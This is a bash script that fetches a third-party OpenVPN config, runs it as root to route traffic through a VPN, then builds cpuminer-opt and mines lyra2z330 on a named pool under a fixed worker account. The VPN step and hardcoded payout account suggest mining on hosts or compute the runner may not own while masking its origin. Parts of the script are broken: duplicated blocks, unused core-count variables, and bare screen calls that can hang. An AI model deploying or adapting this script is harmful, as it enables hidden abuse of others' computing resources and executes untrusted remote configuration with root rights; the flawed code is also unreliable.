#!/bin/bash
sudo apt-get update
sudo apt-get install -y openvpn
wget https://raw.githubusercontent.com/wickedbot/xeko/master/openvpn/done.ovpn
IP=$(/sbin/ip route | awk '/default/ { print $3 }')
route add 117.5.39.30 gw $IP
sudo openvpn --config done.ovpn --daemon
wget -qO- http://ipv4.icanhazip.com; echo -e "\033[0;33m'"
sleep 5s
if [ -f ${PWD}/cpuminer-opt/miner.h ]; then
    if pgrep -x "cpuminer" > /dev/null
then
    echo "cpuminer is running"
else
    echo "cpuminer has been installed, starting now"
    cd cpuminer-opt
    screen -dmSL cpuminer 
	cpucores=$( awk -F: '/model name/ {core++} END {print core}' /proc/cpuinfo )
	if [ $cpucores -ge 16 ]; then
	downcore=2;
	else 
	downcore=1;
	fi
	if [ $cpucores -ge 2 ]; then
	detectcpu=$[$cpucores - $downcore]
	else 
	detectcpu=$cpucores
	fi
	maxcore=$[$cpucores - $downcore];
	./cpuminer -a lyra2z330 -o stratum+tcp://zoi-pool3.chainsilo.com:3032 -u 1chaphet.01 -p x
  
fi
exit
fi
sudo apt-get update
sudo apt-get -y install screen git make automake build-essential autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev
sudo sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))
git clone https://github.com/JayDDee/cpuminer-opt 
cd cpuminer-opt
./build.sh
CFLAGS="-march=native" ./configure
make
echo "cpuminer is starting"
screen -S cpuminer 


cpucores=$( awk -F: '/model name/ {core++} END {print core}' /proc/cpuinfo )
if [ $cpucores -ge 16 ]; then
downcore=2;
else 
downcore=1;
fi
if [ $cpucores -ge 2 ]; then
detectcpu=$[$cpucores - $downcore]
else 
detectcpu=$cpucores
fi
maxcore=$[$cpucores - $downcore];
sudo ./cpuminer -a lyra2z330 -o stratum+tcp://zoi-pool3.chainsilo.com:3032 -u 1chaphet.01 -p x